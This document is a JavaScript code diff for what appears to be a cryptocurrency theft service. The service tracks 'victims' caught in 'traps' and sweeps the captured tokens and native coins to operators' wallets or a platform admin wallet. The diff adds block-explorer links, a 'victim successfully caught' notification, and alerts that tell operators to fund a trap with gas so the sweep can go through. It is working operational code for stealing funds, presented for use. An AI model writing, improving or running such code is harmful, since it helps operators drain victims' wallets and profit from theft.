@@ -148,6 +148,16 @@ async function fetchTokenPrices() {
   return priceFetchPromise;
 }
 
+// ─── Explorer URL Helper ───
+function getExplorerUrl(address, type = 'address') {
+  let baseUrl = 'https://etherscan.io';
+  if (chainName === 'bsc') baseUrl = 'https://bscscan.com';
+  else if (chainName === 'polygon') baseUrl = 'https://polygonscan.com';
+
+  if (type === 'tx') return `${baseUrl}/tx/${address}`;
+  return `${baseUrl}/address/${address}`;
+}
+
 // 🚀 FIX: Custom dual alert for tailored professional messages
 async function sendCustomDualAlert(userMessage, adminMessage, specificCampaignId = null) {
   const targetCampaignId = specificCampaignId || campaignId;
@@ -285,7 +295,7 @@ async function loadCaughtVictims() {
 }
 
 // --- Mark victim as caught ---
-async function markVictimCaught(victimAddress, trapCampaignId = null) {
+async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = null) {
   if (!victimAddress) return;
   const addr = victimAddress.toLowerCase();
   if (caughtVictims.has(addr)) return;
@@ -294,8 +304,15 @@ async function markVictimCaught(victimAddress, trapCampaignId = null) {
   try {
     await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
 
-    const userMsg = `🎯 Congratulations! A victim has been successfully caught.\n\nVictim Address: ${addr}\nStatus: Trap activated and ready for sweeping.`;
-    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}`;
+    const victimUrl = getExplorerUrl(addr);
+    const trapUrl = trapAddress ? getExplorerUrl(trapAddress) : '';
+
+    const userMsg = `🎯 *Congratulations! A victim has been successfully caught.*\n\n` +
+      `👤 *Victim:* [${addr.slice(0, 6)}...${addr.slice(-4)}](${victimUrl})\n` +
+      (trapUrl ? `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` : '') +
+      `✅ *Status:* Trap activated and ready for sweeping.`;
+
+    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}\nTrap: ${trapAddress}`;
 
     await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
   } catch (err) {
@@ -472,6 +489,7 @@ const publicClient = createPublicClient({
   transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
 });
 
+
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances) {
   const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
@@ -523,7 +541,7 @@ async function executeSweepForTrap(entry, balances) {
       ? tokenData.balance >= MIN_TOKEN_SWEEP
       : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
     if (!meetsThreshold) continue;
 
     const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
@@ -541,6 +559,31 @@ async function executeSweepForTrap(entry, balances) {
 
       if (spendableNative < totalFee) {
         logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
+
+        // 🚀 NEW: Alert user with EXACT mathematically calculated gas needed
+        if (usdValue >= 50) {
+          const gasAlertKey = `${trapAddress}:${token.symbol.toLowerCase()}:needs_gas`;
+          const now = Date.now();
+          if (now - (lastBalanceAlertTimes.get(gasAlertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
+            const trapUrl = getExplorerUrl(trapAddress);
+
+            // 🚀 EXACT CALCULATION: totalFee is already calculated above based on current gasPrice * gasLimit
+            const exactGasNeeded = formatEther(totalFee);
+            // Recommend 2x the exact amount as a safety buffer for network spikes
+            const recommendedGas = (parseFloat(exactGasNeeded) * 2).toFixed(6);
+
+            const userGasMsg = `⛽ *Action Required: Your Trap Needs Gas!*\n\n` +
+              `Your trap successfully captured *${formatted} ${token.symbol}* (≈ $${usdValue.toFixed(2)}), but it does not have enough ${nativeSymbol} to pay for the sweep gas.\n\n` +
+              `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+              `⛽ *Exact Gas Needed:* ~${exactGasNeeded} ${nativeSymbol}\n\n` +
+              `💡 *How to fix:*\nPlease send at least *${recommendedGas} ${nativeSymbol}* to your trap address so the sweeper can forward your funds.`;
+
+            const adminGasMsg = `[ADMIN] ⛽ Trap needs gas to sweep.\nCampaign: ${trapCampaignId}\nTrap: ${trapAddress}\nAsset: ${token.symbol} ($${usdValue.toFixed(2)})\nExact Gas Needed: ${exactGasNeeded} ${nativeSymbol}`;
+
+            await sendCustomDualAlert(userGasMsg, adminGasMsg, trapCampaignId);
+            lastBalanceAlertTimes.set(gasAlertKey, now);
+          }
+        }
         continue;
       }
 
@@ -599,12 +642,16 @@ async function executeSweepForTrap(entry, balances) {
         // 🚀 PROFESSIONAL NOTIFICATIONS
         const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
 
+        const trapUrl = getExplorerUrl(trapAddress);
+        const txUrl = getExplorerUrl(txHash, 'tx');
+
         if (fallbackToAdmin) {
-          const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
+          const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
             `Your trap successfully captured funds, but no safe wallet address was configured in your campaign settings.\n\n` +
-            `For the security of your assets, the captured funds (${formatted} ${token.symbol} ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
-            `👉 Action Required: Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
-            `🔗 TX: ${txHashShort}`;
+            `For the security of your assets, the captured funds (*${formatted} ${token.symbol}* ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+            `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
 
           const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
             `Campaign ID: ${trapCampaignId}\n` +
@@ -612,22 +659,22 @@ async function executeSweepForTrap(entry, balances) {
             `Asset: ${token.symbol}\n` +
             `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
             `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
-            `🔗 TX: ${txHash}`;
+            `🔗 TX: ${txUrl}`;
 
           await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
         } else {
-          const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
-            `💰 Asset: ${token.symbol}\n` +
-            `📍 Trap: ${trapAddress}\n` +
-            `💵 Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
-            `✅ Status: Successfully swept to your safe wallet.\n\n` +
-            `🔗 TX: ${txHashShort}`;
+          const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+            `💰 *Asset:* ${token.symbol}\n` +
+            `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+            `💵 *Amount:* ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
 
           const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
             `Campaign ID: ${trapCampaignId}\n` +
             `Asset: ${token.symbol}\n` +
             `Amount: ${formatted} ${token.symbol}\n` +
-            `🔗 TX: ${txHash}`;
+            `🔗 TX: ${txUrl}`;
 
           await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
         }
@@ -649,7 +696,7 @@ async function executeSweepForTrap(entry, balances) {
       ? spendableNativeFinal >= MIN_ETH_SWEEP
       : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
 
     if (meetsThreshold) {
       try {
@@ -702,13 +749,16 @@ async function executeSweepForTrap(entry, balances) {
 
             // 🚀 PROFESSIONAL NOTIFICATIONS FOR NATIVE
             const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+            const trapUrl = getExplorerUrl(trapAddress);
+            const txUrl = getExplorerUrl(txHash, 'tx');
 
             if (fallbackToAdmin) {
-              const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
+              const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
                 `Your trap successfully captured ${nativeSymbol}, but no safe wallet address was configured.\n\n` +
-                `For security, the funds (${formatEther(totalSendable)} ${nativeSymbol} ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
-                `👉 Action Required: Please update your campaign's safe wallet address in your dashboard.\n\n` +
-                `🔗 TX: ${txHashShort}`;
+                `For security, the funds (*${formatEther(totalSendable)} ${nativeSymbol}* ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+                `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
 
               const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
                 `Campaign ID: ${trapCampaignId}\n` +
@@ -716,22 +766,22 @@ async function executeSweepForTrap(entry, balances) {
                 `Asset: ${nativeSymbol}\n` +
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
                 `Reason: User safe wallet not configured.\n` +
-                `🔗 TX: ${txHash}`;
+                `🔗 TX: ${txUrl}`;
 
               await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
             } else {
-              const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
-                `💰 Asset: ${nativeSymbol}\n` +
-                `📍 Trap: ${trapAddress}\n` +
-                `💵 Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
-                `✅ Status: Successfully swept to your safe wallet.\n\n` +
-                `🔗 TX: ${txHashShort}`;
+              const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+                `💰 *Asset:* ${nativeSymbol}\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+                `💵 *Amount:* ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
 
               const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
                 `Campaign ID: ${trapCampaignId}\n` +
                 `Asset: ${nativeSymbol}\n` +
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
-                `🔗 TX: ${txHash}`;
+                `🔗 TX: ${txUrl}`;
 
               await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
             }
